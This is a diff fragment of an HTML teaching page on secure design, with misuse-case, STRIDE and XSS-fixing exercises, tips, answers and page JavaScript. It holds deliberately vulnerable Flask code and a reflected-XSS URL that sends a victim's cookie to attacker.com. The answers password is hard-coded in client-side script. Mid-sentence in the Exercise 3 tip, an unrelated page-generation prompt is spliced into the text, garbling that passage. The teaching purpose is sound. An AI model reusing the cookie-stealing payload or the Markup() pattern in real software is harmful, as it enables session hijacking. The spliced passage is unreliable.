+                        <span class="text-sm ml-2" style="color: var(--text-muted);">(Import images, .txt, .md, or .html files. For other types, please copy/paste.)</span>
+                    </div>
+                    <div class="answer-box" contenteditable="true" aria-label="Answer box for Exercise 2"></div>
+                </div>
+            </details>
+
+            <!-- Exercise 3 -->
+            <details class="exercise" data-exercise-id="3">
+                <summary>Exercise 3: Identify & Fix Vulnerable Code</summary>
+                <div>
+                    <p class="mt-2">The following Python code (using the Flask framework) is intended to power a search page. It takes a search query from the URL and displays it back to the user.</p>
+                    <p class="mt-2">This code contains a critical security vulnerability mentioned in the lecture.
+                    <br>
+                    <strong>1.</strong> Identify the vulnerability.<br>
+                    <strong>2.</strong> Describe the type of attack it allows.<br>
+                    <strong>3.</strong> Rewrite the <code>search()</code> function to be secure.</p>
+                    
+                    <div class="python-runner mt-4">
+                        <pre><code>from flask import Flask, request, Markup
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    # Get the search query from the URL (e.g., /search?q=myquery)
+    query = request.args.get('q', '') # Get 'q' parameter
+    
+    # --- VULNERABLE PART ---
+    # Display the user's query back to them
+    html_response = f"&lt;h1&gt;Search results for: {Markup(query)}&lt;/h1&gt;"
+    
+    # ... code to search the database would go here ...
+    
+    return html_response
+</code></pre>
+                        <div class="python-runner-output" style="display: block; border-style: solid; background-color: var(--code-bg); color: var(--text-muted);">&lt;!-- This code is vulnerable and for analysis only. --&gt;</div>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <button class="btn btn-sm btn-import">Import Content</button>
+                        <span class="text-sm ml-2" style="color: var(--text-muted);">(Import images, .txt, .md, or .html files. For other types, please copy/paste.)</span>
+                    </div>
+                    <div class="answer-box" contenteditable="true" aria-label="Answer box for Exercise 3"></div>
+                </div>
+            </details>
+
+            <!-- 
+              SUBMIT YOUR WORK SECTION
+              This section is only visible on the Exercises page.
+            -->
+            <section id="submit-work-section" class="pt-8 mt-8 border-t-2" style="border-color: var(--border-main);">
+                <h2 class="text-3xl font-bold">Submit Your Work</h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
+                    <!-- Column 1: Student Info & Instructions -->
+                    <div>
+                        <h3 class="text-xl font-semibold">1. Enter Your Details</h3>
+                        <div class="space-y-4 mt-4">
+                            <div>
+                                <label for="student-name" class="block text-sm font-medium">Your Name:</label>
+                                <input type="text" id="student-name" class="submission-input w-full mt-1" placeholder="Jane Doe">
+                            </div>
+                            <div>
+                                <label for="student-id" class="block text-sm font-medium">Student ID:</label>
+                                <input type="text" id="student-id" class="submission-input w-full mt-1" placeholder="12345678">
+                            </div>
+                        </div>
+                        
+                        <h3 class="text-xl font-semibold mt-8">3. How to Use</h3>
+                        <div class="p-4 rounded-md mt-4" style="background-color: var(--bg-accent);">
+                            <p><strong>Option A (Recommended): Send via Email</strong></p>
+                            <p class="text-sm mt-1" style="color: var(--text-muted);">Click the "Send Answers via Email" button. This will gather your answers and open your local email client.</p>
+                            <p class="mt-2"><strong>Option B: Copy & Download</strong></p>
+                            <p class="text-sm mt-1" style="color: var(--text-muted);">Click "Copy & Download Answers (.txt)". This copies everything to your clipboard AND downloads a .txt file as a backup.</p>
+                            <p class="mt-2"><strong>If Email Fails:</strong></p>
+                            <p class="text-sm mt-1" style="color: var(--text-muted);">If the email button doesn't work, please use Option B and manually attach the downloaded .txt file to an email to <strong>asengroa@hotmail.com</strong>.</p>
+                        </div>
+                    </div> <!-- END OF COLUMN 1 -->
+                    
+                    <!-- Column 2: Actions -->
+                    <div>
+                        <h3 class="text-xl font-semibold">2. Submit</h3>
+                        <div class="space-y-4 mt-4">
+                            <button id="send-email" class="btn w-full text-center">Send Answers via Email</button>
+                            <button id="copy-download" class="btn btn-secondary w-full text-center">Copy & Download Answers (.txt)</button>
+                        </div>
+                        <!-- Feedback message area -->
+                        <div id="submit-feedback" class="hidden p-3 rounded-md mt-4 text-center font-medium"></div>
+                    </div> <!-- END OF COLUMN 2 -->
+                    
+                </div> <!-- END OF GRID -->
+            </section> <!-- END OF SUBMIT WORK SECTION -->
+
+        </section> <!-- END OF EXERCISES SECTION -->
+
+        <!-- ****************** TIPS SECTION ****************** -->
+        <section id="tips-content" class="main-content-page space-y-6">
+            <h2 class="text-3xl font-bold border-b-2 pb-2" style="border-color: var(--border-main);">Tips</h2>
+            <details>
+                <summary>Exercise 1: Create a Misuse Case</summary>
+                <div>
+                    <p>Think about how an attacker would *benefit* from the password reset feature. What is their goal?</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Goal 1:</strong> To reset a *specific person's* password (e.g., an admin).</li>
+                        <li><strong>Goal 2:</strong> To discover if a *username* is valid.</li>
+                        <li>How is the reset link/code delivered? Can that be intercepted?</li>
+                        <li>What information does the attacker need to initiate the reset? Can they guess it?</li>
+                    </ul>
+                </div>
+            </details>
+            <details>
+                <summary>Exercise 2: Apply STRIDE</summary>
+                <div>
+                    <p>Focus on the "Web Server" circle itself. What can go wrong *with the server*?</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Spoofing:</strong> Could the server pretend to be another server? (Less common, but think about DNS).</li>
+                        <li><strong>Tampering:</strong> Can an attacker change the *code running on the server*? (e.g., if they gain file access).</li>
+                        <li><strong>Information Disclosure:</strong> What if the server crashes? Does it show a detailed error message with code snippets? That's an 'I' threat.</li>
+                        <li><strong>Denial of Service:</strong> This is a big one. What happens if 1 million users try to update their profile at the same time?</li>
+                        <li><strong>Elevation of Privilege:</strong> What user does the web server process run as? Does it run as 'root' or 'admin'? If an attacker compromises it, they get 'root' privileges. This is the 'E' threat.</li>
+                    </ul>
+                </div>
+            </details>
+            <details>
+                <summary>Exercise 3: Identify & Fix Vulnerable Code</summary>
+                <div>
+                    <p>Look at the "Secure Coding Practices" section, specifically example #7.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>The code takes user input (<code>query</code>) and puts it *directly into an HTML response*.</li>
+                        <li>The <code>Markup()</code> function is a giant red flag. It's explicitly telling Flask "I trust this string, do not escape it."</li>
+                        <li>What happens if an attacker sets their query to <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code>?</li>
+                        <li>The fix involves *removing* Do not use external  image- links. Instead, generate and embed the images / diagrams directly into the HTML file as SVG graphics !!!
+Make ABSOLUTELY SURE the code of the html- file will be protected from all known web- application attacks !!!
+When you will add python examples, make sure there will be "run" and "clear" buttons so to run the examples into the sand-box, and then to be able to clear the output !!!
+
+On the very top, left side of the "page", give it a name as per the name of the file.
+Please, use themes of solarized light and solarized dark.
+On the very top, right side, please add a "switch" that to be able to toggle between the themes. Make sure, the switch won't be too far away on the right and it is FULLY VISIBLE !
+Make sure, on the very top, right side, before the the theme's "switch"- control, there will be buttons to "expand all", and "collapse all" so the material presented to be better visible and organized !
+
+Create top- main menu. Make sure, all the top- main menu items, EXCEPT "evaluation grid" one, will use the "expand all", and "collapse all"- feature !!!
+Make sure, on-click on a section from the top- main menu, only the content of this particular section will be displayed, so to create cleaner, singe-page application experience !!! 
+Make sure the main- top menu will be visible on scrolling up and down the html- file !
+Create top- main menu with the following sections :
+1. Lecture - where the content material will be,
+2. Exercises - where the exercises will be. After each "exercise" add :
+a/ a text- "box" where student could answer directly to the question asked,
+b/ make sure, the students can indeed import into the text- "box"- local documents, images, charts, spreadsheets etc.! Create an "import"- button within the "text"- box so to help with this !,
+Make sure, when on-click on "import content"- button and if the student "click" on ms word or similar, or pdf - and the content of the clicked file is complex - have text, links, images, diagrams, spreadsheets embedded in it :
+- convert the content,
+- import it in the box as html or md.
+The overall idea is if the imported contents in all "boxes" in all "exercises" have this complex, mixed content, the file that would be produced (html or md), when clicked on "copy & download answers (.txt)" or "send answers via email" to have all the "mixed" content still in it so when received by the teacher to be able to check it or export it somewhere easily !!!
+3. Tips - where useful tips for each exercise will be given,
+4. Explanations - for the explanations of the questions,
+5. Answers - where the answers to an exercises will be. Protect the "answer"- section with a password that is done as per the below :
+a/ the password should be "student=2025",
+b/ method: please use a simple and reliable direct password check in the JavaScript,
+c/ user experience:
+- when the user clicks the protected element, a pop-up (modal) should appear asking for the password,
+- if the password is correct, the content should be revealed, and the user should not be asked for the password again during their session,
+- if the password is incorrect, an error message should be displayed.
+d/ on the top of the password "box" also add (make sure each sentence will be on a separated line as shown below !) :
+"Please enter the password to view the answers.
+If you want to Cancel the action, click outside the "Password Required" box.
+You can see the entered password by clicking on the "eye" icon."
+6.Evaluation grid - how the exercises will be graded.
+Make sure, the top- main menu will be "persistently seen" while scrolling up and down the sections !!!
+
+I have selected " <code>Markup()</code> and using a method that *automatically escapes* the user's input.</li>
+                    </ul>
+                </div>
+            </details>
+        </section>
+
+        <!-- ****************** EXPLANATIONS SECTION ****************** -->
+        <section id="explanations-content" class="main-content-page space-y-6">
+            <h2 class="text-3xl font-bold border-b-2 pb-2" style="border-color: var(--border-main);">Explanations</h2>
+            
+            <details>
+                <summary>Explanation for Exercise 1</summary>
+                <div>
+                    <p>The "Password Reset" feature is a classic attack target because it's designed to bypass the primary authentication (the password). An attacker's goal is to take control of an account.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Misuse Case 1: Intercept Reset Token.</strong> If the reset link is sent via an unencrypted channel (like HTTP or basic email), an attacker (e.g., on the same Wi-Fi) could "sniff" the network, steal the token, and reset the password themselves.
+                            <ul><li><strong>Mitigation:</strong> Use HTTPS (TLS) for the entire reset process and send reset links with a short expiration time (e.g., 10 minutes).</li></ul>
+                        </li>
+                        <li><strong>Misuse Case 2: Username Enumeration.</strong> An attacker tries to reset 'admin@company.com'. The site says "Email sent." They try 'notauser@company.com' and the site says "User not found." The attacker can now use this feature to build a list of valid usernames.
+                            <ul><li><strong>Mitigation:</strong> Use a generic, identical response for all attempts: "If an account with that email exists, a reset link has been sent."</li></ul>
+                        </li>
+                         <li><strong>Misuse Case 3: Insecure "Secret Question".</strong> If the reset relies on "secret questions" (e.g., "What was your first pet's name?"), an attacker can often find this information via social media (social engineering).
+                            <ul><li><strong>Mitigation:</strong> Do not use secret questions. Rely on a secure, out-of-band channel like email or an authenticator app.</li></ul>
+                        </li>
+                    </ul>
+                </div>
+            </details>
+            
+            <details>
+                <summary>Explanation for Exercise 2</summary>
+                <div>
+                    <p>Applying STRIDE to the "1.0 Web Server" process:</p>
+                    <ol class="list-decimal list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>(S) Spoofing:</strong> An attacker could perform DNS spoofing to redirect the user to a malicious server that *looks* like the real one. 
+                            <ul><li><strong>Mitigation:</strong> Server-side, use digital certificates (HTTPS/TLS) so the user's browser can verify the server's identity.</li></ul>
+                        </li>
+                        <li><strong>(I) Information Disclosure:</strong> If the web server crashes (e.g., due to a malformed profile update), it might return a detailed stack trace (a long error message) to the user. This message could reveal file paths, library versions, and database query structures.
+                            <ul><li><strong>Mitigation:</strong> Configure the server to only show generic, non-detailed error messages (e.g., "HTTP 500: Internal Server Error") to the user, while logging the full details to a secure, private file.</li></ul>
+                        </li>
+                        <li><strong>(D) Denial of Service:</strong> An attacker could send 10,000 "Profile Update Requests" per second. If the server tries to process them all, it will exhaust its CPU or memory and crash, becoming unavailable to legitimate users.
+                            <ul><li><strong>Mitigation:</strong> Implement rate-limiting. For example, "Allow a maximum of 5 profile updates per minute from a single IP address."</li></ul>
+                        </li>
+                        <li><strong>(E) Elevation of Privilege:</strong> The web server process (the code itself) runs on the server's operating system. If it runs as the 'root' or 'Administrator' user, any vulnerability (like an SQL injection or insecure deserialization) that allows an attacker to run code will give them *full control over the entire server*.
+                            <ul><li><strong>Mitigation:</strong> Adhere to the Principle of Least Privilege. Run the web server process as a dedicated, low-privilege user (e.g., 'www-data') that has *just enough* permission to run the website and nothing else.</li></ul>
+                        </li>
+                    </ol>
+                </div>
+            </details>
+            
+            <details>
+                <summary>Explanation for Exercise 3</summary>
+                <div>
+                    <p><strong>1. Identify the vulnerability:</strong> The vulnerability is a <strong>Reflected Cross-Site Scripting (XSS)</strong> attack.</p>
+                    <p><strong>2. Describe the attack:</strong> The code takes raw user input from the URL (<code>request.args.get('q')</code>) and explicitly tells the server to treat it as "safe" HTML by wrapping it in <code>Markup()</code>. An attacker can craft a malicious URL like:</p>
+                    <p class="p-2 my-2 rounded" style="background-color: var(--code-bg); color: var(--code-text); font-family: monospace; overflow-wrap: break-word;">
+                        /search?q=&amp;lt;script&amp;gt;document.location='http://attacker.com/steal?cookie='+document.cookie&amp;lt;/script&amp;gt;
+                    </p>
+                    <p>When the victim clicks this link, their browser executes the script. The script steals the user's session cookie and sends it to the attacker's server, allowing the attacker to hijack the user's session.</p>
+                    
+                    <p class="mt-4"><strong>3. Rewrite the <code>search()</code> function to be secure:</strong></p>
+                    <p>The fix is to *never* use <code>Markup()</code> with user input. Instead, use the built-in templating engine (Jinja2) which escapes data by default.</p>
+                    
+                    <div class="python-runner mt-4">
+                        <pre><code>from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    # Get the search query from the URL (e.g., /search?q=myquery)
+    query = request.args.get('q', '') # Get 'q' parameter
+    
+    # --- SECURE VERSION ---
+    # Use the template engine. 'query' will be automatically escaped.
+    # An input of "&lt;script&gt;" will be rendered as "&amp;lt;script&amp;gt;"
+    template = "&lt;h1&gt;Search results for: {{ user_query }}&lt;/h1&gt;"
+    
+    # ... code to search the database would go here ...
+    
+    # Safely render the template, passing the untrusted data
+    # as a variable.
+    return render_template_string(template, user_query=query)
+
+</code></pre>
+                        <div class="python-runner-output" style="display: block; border-style: solid; background-color: var(--code-bg); color: var(--text-muted);">&lt;!-- (No output, this is the corrected code) --&gt;</div>
+                    </div>
+                </div>
+            </details>
+        </section>
+
+        <!-- ****************** ANSWERS SECTION ****************** -->
+        <section id="answers-content" class="main-content-page space-y-6">
+            <h2 class="text-3xl font-bold border-b-2 pb-2" style="border-color: var(--border-main);">Answers</h2>
+            
+            <div id="protected-answers" style="display: none;">
+                <p class="text-lg">This section provides the correct answers for the exercises. Compare them with your own work.</p>
+                
+                <details class="mt-4">
+                    <summary>Answer for Exercise 1</summary>
+                    <div>
+                        <p><strong>Misuse Case 1: Hostile Account Takeover</strong></p>
+                        <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                            <li><strong>Threat:</strong> Attacker intercepts the password reset email (e.g., via network sniffing or by compromising the email account).</li>
+                            <li><strong>Mitigation:</strong> Ensure all password reset pages are served over HTTPS. Send a one-time-use link that expires after a short period (e.g., 10-15 minutes).</li>
+                        </ul>
+                        
+                        <p class="mt-4"><strong>Misuse Case 2: Username Enumeration</strong></p>
+                        <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                            <li><strong>Threat:</strong> Attacker uses the reset form to test for valid usernames. If the site responds with "User not found" for one email and "Email sent" for another, the attacker knows the second email is a valid user.</li>
+                            <li><strong>Mitigation:</strong> Always show a generic, identical response, such as: "If an account with this email address exists, a password reset link has been sent."</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details class="mt-4">
+                    <summary>Answer for Exercise 2</summary>
+                    <div>
+                        <p>STRIDE analysis for the "1.0 Web Server" process:</p>
+                        <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                            <li><strong>Information Disclosure:</strong> If the server crashes due to bad input, it might return a detailed error message (stack trace) to the attacker, revealing server file paths, library versions, and parts of the code.
+                                <ul><li><strong>Mitigation:</strong> Implement custom error pages. Show a generic "An error occurred" message to the user and log the detailed stack trace to a secure, admin-only file.</li></ul>
+                            </li>
+                            <li><strong>Denial of Service:</strong> An attacker can send thousands of requests per second, overwhelming the server's CPU/memory and making it unavailable for legitimate users.
+                                <ul><li><strong>Mitigation:</strong> Implement rate-limiting (e.g., max 10 requests/second per IP) and use a Web Application Firewall (WAF) to block malicious traffic patterns.</li></ul>
+                            </li>
+                            <li><strong>Elevation of Privilege:</strong> If the web server process runs as a high-privilege user (like 'root' or 'Administrator'), an attacker who finds *any* code execution vulnerability can take full control of the entire server.
+                                <ul><li><strong>Mitigation:</strong> Principle of Least Privilege. Run the web server process using a dedicated, low-privilege service account (e.g., 'www-data') that only has permission to read/write its own files.</li></ul>
+                            </li>
+                        </ul>
+                    </div>
+                </details>
+                
+                <details class="mt-4">
+                    <summary>Answer for Exercise 3</summary>
+                    <div>
+                        <p><strong>1. Vulnerability:</strong> Reflected Cross-Site Scripting (XSS).</p>
+                        <p><strong>2. Attack:</strong> An attacker can craft a URL containing a malicious script and send it to a victim. When the victim clicks the link, their browser executes the script because the server reflects it back onto the page using <code>Markup()</code>, which disables Flask's built-in XSS protection.</p>
+                        <p><strong>3. Secure Code:</strong></p>
+                        <div class="python-runner mt-4">
+                            <pre><code>from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    
+    # --- SECURE VERSION ---
+    # We use a template, which automatically escapes the variable.
+    # The 'Markup()' call is removed.
+    template = "&lt;h1&gt;Search results for: {{ user_query }}&lt;/h1&gt;"
+    
+    # render_template_string will safely replace {{ user_query }}
+    # with the text from 'query', converting characters like '&lt;'
+    # into '&amp;lt;' so they are rendered as text, not HTML.
+    return render_template_string(template, user_query=query)
+</code></pre>
+                            <div class="python-runner-output" style="display: block; border-style: solid; background-color: var(--code-bg); color: var(--text-muted);">&lt;!-- (No output, this is the corrected code) --&gt;</div>
+                        </div>
+                    </div>
+                </details>
+            </div>
+        </section>
+
+        <!-- ****************** EVALUATION GRID SECTION ****************** -->
+        <section id="evaluation-grid-content" class="main-content-page">
+            <h2 class="text-3xl font-bold border-b-2 pb-2" style="border-color: var(--border-main);">Evaluation Grid</h2>
+            <p class="mt-4">Your answers will be graded based on the following criteria. Note that this section does not use the "Expand/Collapse" feature.</p>
+            
+            <div class="overflow-x-auto mt-6">
+                <table class="w-full min-w-full text-left" style="border-collapse: collapse; border: 1px solid var(--border-main);">
+                    <thead>
+                        <tr style="background-color: var(--bg-accent);">
+                            <th class="p-3 font-semibold" style="border: 1px solid var(--border-main);">Exercise</th>
+                            <th class="p-3 font-semibold" style="border: 1px solid var(--border-main);">Criteria</th>
+                            <th class="p-3 font-semibold" style="border: 1px solid var(--border-main);">Points</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main); font-weight: 600;">Exercise 1: Misuse Case</td>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main);">
+                                <ul class="list-disc list-outside ml-5">
+                                    <li>Identification of two (2) distinct, relevant misuse cases (threats).</li>
+                                    <li>Clarity of the misuse case descriptions.</li>
+                                    <li>Identification of one (1) appropriate mitigation for each misuse case.</li>
+                                </ul>
+                            </td>
+                            <td class="p-3 align-top text-center" style="border: 1px solid var(--border-main);">30</td>
+                        </tr>
+                        <tr>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main); font-weight: 600;">Exercise 2: Apply STRIDE</td>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main);">
+                                <ul class="list-disc list-outside ml-5">
+                                    <li>Identification of three (3) distinct threats to the "Process" element.</li>
+                                    <li>Correctly categorizing each threat using a STRIDE category.</li>
+                                    <li>Providing a logical and effective mitigation for each threat.</li>
+                                </ul>
+                            </td>
+                            <td class="p-3 align-top text-center" style="border: 1px solid var(--border-main);">30</td>
+                        </tr>
+                        <tr>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main); font-weight: 600;">Exercise 3: Fix Code</td>
+                            <td class="p-3 align-top" style="border: 1px solid var(--border-main);">
+                                <ul class="list-disc list-outside ml-5">
+                                    <li>Correctly identifying the vulnerability as (Reflected) Cross-Site Scripting (XSS).</li>
+                                    <li>Clearly explaining *why* it is vulnerable (use of <code>Markup()</code>, failure to sanitize output).</li>
+                                    <li>Providing a secure, functional rewrite of the <code>search()</code> function that correctly uses templating (e.g., <code>render_template_string</code>) to escape the output.</li>
+                                </ul>
+                            </td>
+                            <td class="p-3 align-top text-center" style="border: 1px solid var(--border-main);">40</td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" class="p-3 align-top text-right font-bold" style="border: 1px solid var(--border-main);">Total</td>
+                            <td class="p-3 align-top text-center font-bold" style="border: 1px solid var(--border-main);">100</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // Use an IIFE (Immediately Invoked Function Expression) to avoid polluting the global scope
+        (function() {
+            // Wait for the DOM to be fully loaded before running scripts
+            document.addEventListener('DOMContentLoaded', () => {
+                
+                // --- ELEMENT SELECTORS ---
+                const themeToggle = document.getElementById('theme-checkbox');
+                const expandAllBtn = document.getElementById('expand-all');
+                const collapseAllBtn = document.getElementById('collapse-all');
+                const navLinks = document.querySelectorAll('.nav-link');
+                const contentPages = document.querySelectorAll('.main-content-page');
+                const navLinkAnswers = document.getElementById('nav-link-answers');
+                const passwordModal = document.getElementById('password-modal');
+                const passwordInput = document.getElementById('password-input');
+                const passwordSubmit = document.getElementById('password-submit');
+                const passwordError = document.getElementById('password-error');
+                const togglePasswordBtn = document.getElementById('toggle-password');
+                const eyeIcon = document.getElementById('eye-icon');
+                const eyeSlashIcon = document.getElementById('eye-slash-icon');
+                const protectedAnswers = document.getElementById('protected-answers');
+                const submitWorkSection = document.getElementById('submit-work-section');
+                
+                // Python Runners
+                const runButtons = document.querySelectorAll('.btn-run');
+                const clearButtons = document.querySelectorAll('.btn-clear');
+
+                // Submission Section
+                const sendEmailBtn = document.getElementById('send-email');
+                const copyDownloadBtn = document.getElementById('copy-download');
+                const studentNameInput = document.getElementById('student-name');
+                const studentIdInput = document.getElementById('student-id');
+                const submitFeedback = document.getElementById('submit-feedback');
+                
+                // File Import
+                const importButtons = document.querySelectorAll('.btn-import');
+                const fileImporter = document.getElementById('file-importer');
+                const importErrorModal = document.getElementById('import-error-modal');
+                const importErrorMessage = document.getElementById('import-error-message');
+                let currentAnswerBox = null; // Store the target answer box for import
+
+                
+                // --- 1. THEME SWITCHER LOGIC ---
+                
+                // Function to apply theme
+                function applyTheme(theme) {
+                    if (theme === 'dark') {
+                        document.body.classList.add('dark-theme');
+                        themeToggle.checked = true;
+                    } else {
+                        document.body.classList.remove('dark-theme');
+                        themeToggle.checked = false;
+                    }
+                }
+
+                // Check for saved theme in localStorage
+                const savedTheme = localStorage.getItem('theme');
+                if (savedTheme) {
+                    applyTheme(savedTheme);
+                } else {
+                    // Check for system preference
+                    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+                    applyTheme(prefersDark ? 'dark' : 'light');
+                }
+
+                // Add listener to the toggle
+                themeToggle.addEventListener('change', () => {
+                    const theme = themeToggle.checked ? 'dark' : 'light';
+                    localStorage.setItem('theme', theme);
+                    applyTheme(theme);
+                });
+
+                
+                // --- 2. NAVIGATION LOGIC ---
+                
+                // Function to get the currently visible content page
+                function getVisibleContentPage() {
+                    let visiblePage = null;
+                    contentPages.forEach(page => {
+                        if (page.style.display === 'block') {
+                            visiblePage = page;
+                        }
+                    });
+                    // Fallback if none are block (e.g., on first load before JS)
+                    return visiblePage || document.getElementById('lecture-content');
+                }
+
+                // Add click listener to each nav link
+                navLinks.forEach(link => {
+                    link.addEventListener('click', (e) => {
+                        // Special handling for "Answers"
+                        if (link.id === 'nav-link-answers') {
+                            e.preventDefault();
+                            handleAnswersClick();
+                            return;
+                        }
+                        
+                        e.preventDefault();
+                        const targetId = link.getAttribute('href');
+                        
+                        // Hide all pages
+                        contentPages.forEach(page => {
+                            page.style.display = 'none';
+                        });
+                        
+                        // Show target page
+                        const targetPage = document.querySelector(targetId);
+                        if (targetPage) {
+                            targetPage.style.display = 'block';
+                        }
+                        
+                        // Show/Hide "Submit Your Work" section
+                        if (targetId === '#exercises-content') {
+                            submitWorkSection.style.display = 'block';
+                        } else {
+                            submitWorkSection.style.display = 'none';
+                        }
+                        
+                        // Optional: Scroll to top of content
+                        window.scrollTo(0, 0);
+                    });
+                });
+
+                
+                // --- 3. EXPAND/COLLAPSE ALL LOGIC ---
+                
+                expandAllBtn.addEventListener('click', () => {
+                    const visiblePage = getVisibleContentPage();
+                    // Don't apply to evaluation grid
+                    if (visiblePage.id === 'evaluation-grid-content') return;
+                    
+                    const details = visiblePage.querySelectorAll('details');
+                    details.forEach(detail => detail.open = true);
+                });
+                
+                collapseAllBtn.addEventListener('click', () => {
+                    const visiblePage = getVisibleContentPage();
+                    // Don't apply to evaluation grid
+                    if (visiblePage.id === 'evaluation-grid-content') return;
+                    
+                    const details = visiblePage.querySelectorAll('details');
+                    details.forEach(detail => detail.open = false);
+                });
+
+                
+                // --- 4. PASSWORD MODAL & ANSWERS LOGIC ---
+                
+                function showAnswersPage() {
+                    // Hide all pages
+                    contentPages.forEach(page => page.style.display = 'none');
+                    // Show answers page
+                    const answersPage = document.getElementById('answers-content');
+                    answersPage.style.display = 'block';
+                    // Show the protected content within it
+                    protectedAnswers.style.display = 'block';
+                    // Hide submit section
+                    submitWorkSection.style.display = 'none';
+                }
+
+                function handleAnswersClick() {
+                    // Check if already authenticated in this session
+                    if (sessionStorage.getItem('isAnswersAuth') === 'true') {
+                        showAnswersPage();
+                    } else {
+                        // Show password modal
+                        passwordModal.style.display = 'block';
+                        passwordInput.focus();
+                    }
+                }
+                
+                passwordSubmit.addEventListener('click', () => {
+                    if (passwordInput.value === 'student=2025') {
+                        // Correct password
+                        sessionStorage.setItem('isAnswersAuth', 'true');
+                        passwordModal.style.display = 'none';
+                        passwordInput.value = ''; // Clear password
+                        passwordError.classList.add('hidden');
+                        showAnswersPage();
+                    } else {
+                        // Incorrect password
+                        passwordError.classList.remove('hidden');
+                    }
+                });
+
+                // Add listener for Enter key in password field
+                passwordInput.addEventListener('keydown', (e) => {
+                    if (e.key === 'Enter') {
+                        passwordSubmit.click();
+                    }
+                });
+
+                // Toggle password visibility
+                togglePasswordBtn.addEventListener('click', () => {
+                    const isPassword = passwordInput.type === 'password';
+                    passwordInput.type = isPassword ? 'text' : 'password';
+                    eyeIcon.classList.toggle('hidden');
+                    eyeSlashIcon.classList.toggle('hidden');
+                });
+                
+                
+                // --- 5. PYTHON RUNNER SIMULATION ---
+                
+                runButtons.forEach(button => {
+                    button.addEventListener('click', () => {
+                        const runner = button.closest('.python-runner');
+                        const output = runner.querySelector('.python-runner-output');
+                        
+                        output.style.display = 'block';
+                    });
+                });
+                
+                clearButtons.forEach(button => {
+                    button.addEventListener('click', () => {
+                        const runner = button.closest('.python-runner');
+                        const output = runner.querySelector('.python-runner-output');
+                        
+                        output.style.display = 'none';
+                    });
+                });
+
+                
+                // --- 6. FILE IMPORT LOGIC ---
+                
+                importButtons.forEach(button => {
+                    button.addEventListener('click', () => {
+                        // Store which answer box this import is for
+                        currentAnswerBox = button.closest('.exercise').querySelector('.answer-box');
+                        fileImporter.click(); // Trigger the hidden file input
+                    });
+                });
+
+                fileImporter.addEventListener('change', (e) => {
+                    if (!currentAnswerBox) return;
+                    
+                    const file = e.target.files[0];
+                    if (!file) return;
+
+                    const reader = new FileReader();
+
+                    if (file.type.startsWith('image/')) {
+                        // Handle image
+                        reader.onload = (event) => {
+                            const img = document.createElement('img');
+                            img.src = event.target.result;
+                            img.style.maxWidth = '100%';
+                            img.style.height = 'auto';
+                            img.style.borderRadius = '4px';
+                            img.style.margin = '0.5rem 0';
+                            currentAnswerBox.appendChild(img);
+                            // Add a new line after image for easier typing
+                            currentAnswerBox.appendChild(document.createElement('br'));
+                        };
+                        reader.readAsDataURL(file);
+                        
+                    } else if (file.type === 'text/plain' || file.type === 'text/markdown' || file.type === 'text/html') {
+                        // Handle text-based files
+                        reader.onload = (event) => {
+                            // Insert as text to prevent HTML injection from the file
+                            const textNode = document.createTextNode(event.target.result);
+                            currentAnswerBox.appendChild(textNode);
+                            // Add a new line
+                            currentAnswerBox.appendChild(document.createElement('br'));
+                        };
+                        reader.readAsText(file);
+                        
+                    } else {
+                        // Unsupported file type
+                        // Note: Parsing .docx or .pdf is not feasible in a single JS file.
+                        importErrorMessage.textContent = 'File type "' + file.type + '" is not supported. Please import images, .txt, .md, or .html files. For .docx or .pdf, please copy and paste the content manually.';
+                        importErrorModal.style.display = 'block';
+                    }
+                    
+                    // Clear the file input to allow importing the same file again
+                    e.target.value = null;
+                    currentAnswerBox = null;
+                });
+                
+
+                // --- 7. SUBMIT YOUR WORK LOGIC ---
+
+                // Helper function to gather all content
+                function getAllAnswers() {
+                    let content = 'Student Name: ' + (studentNameInput.value || 'Not Provided') + '\n';
+                    content += 'Student ID: ' + (studentIdInput.value || 'Not Provided') + '\n';
+                    content += '==================================================\n\n';
+                    
+                    const exercises = document.querySelectorAll('.exercise');
+                    exercises.forEach(exercise => {
+                        const title = exercise.querySelector('summary').textContent; // Changed from h3
+                        const answerBox = exercise.querySelector('.answer-box');
+                        // Use innerText to get a clean text representation
+                        const answer = answerBox.innerText; 
+                        
+                        content += '--- ' + title + ' ---\n';
+                        content += (answer || '(No answer provided)') + '\n\n';
+                    });
+                    
+                    return content;
+                }
+                
+                // Helper function to get answers as HTML for email
+                function getAllAnswersHTML() {
+                    let content = '<html><body>';
+                    content += '<p><strong>Student Name:</strong> ' + (studentNameInput.value || 'Not Provided') + '</p>';
+                    content += '<p><strong>Student ID:</strong> ' + (studentIdInput.value || 'Not Provided') + '</p>';
+                    content += '<hr>';
+                    
+                    const exercises = document.querySelectorAll('.exercise');
+                    exercises.forEach(exercise => {
+                        const title = exercise.querySelector('summary').textContent; // Changed from h3
+                        const answerBox = exercise.querySelector('.answer-box');
+                        // Use innerHTML to preserve images and formatting
+                        const answer = answerBox.innerHTML; 
+                        
+                        content += '<h2>' + title + '</h2>';
